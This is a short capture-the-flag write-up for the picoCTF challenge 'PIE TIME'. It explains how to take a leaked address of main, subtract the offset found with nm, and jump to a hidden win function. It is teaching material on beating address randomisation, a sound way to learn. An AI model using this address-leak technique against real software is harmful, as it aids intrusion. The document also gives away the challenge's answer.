# PIE TIME picoCTF Write-Up

## Challenge Description
In this challenge, we are given access to a remote server via netcat:
```
nc rescued-float.picoctf.net 52689
```
The program displays the address of the `main` function:
```
Address of main: 0x6169209de33d
Enter the address to jump to, ex => 0x12345:
```
We are also provided with a binary named `vuln`.

## Solution Steps

1. **Identify Important Functions**  
   Use the following command to find the addresses of the `main` and `win` functions:
   ```bash
   nm vuln | grep -E 'main|win'
   ```
   Output:
   ```
   000000000000133d T main
   00000000000012a7 T win
   ```

2. **Calculate the Offset**  
   Calculate the difference between the addresses of `main` and `win`:
   ```
   0x133d - 0x12a7 = 0x96
   ```
   The offset to the `win` function is -0x96 from the address of `main`.

3. **Determine the Address of Win**  
   Given the address of `main` from the server (`0x6169209de33d`), calculate:
   ```
   address_of_win = address_of_main - 0x96
   address_of_win = 0x6169209de33d - 0x96 = 0x6169209DE2A7
   ```

4. **Exploit**  
   Enter the calculated address into the program:
   ```
   Address of main: 0x6169209de33d
   Enter the address to jump to, ex => 0x12345: 0x6169209DE2A7
   Your input: 6169209de2a7
   You won!
   ```
